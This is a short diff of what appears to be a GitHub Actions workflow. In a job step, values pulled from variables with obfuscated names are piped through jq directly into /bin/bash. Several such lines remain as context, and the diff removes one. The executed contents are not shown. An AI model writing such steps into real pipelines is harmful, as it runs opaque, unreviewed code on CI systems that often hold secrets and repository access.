@@ -22,7 +22,6 @@ jobs:
           echo $nzfa15 | jq -r .yrxd45271 | /bin/bash
           echo $g00 | jq -r .mnrl4848 | /bin/bash
           echo $rqm25503 | jq -r .hy64028 | /bin/bash
-          printf '%s' "$wrhkt060" | jq -r .nbb022 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
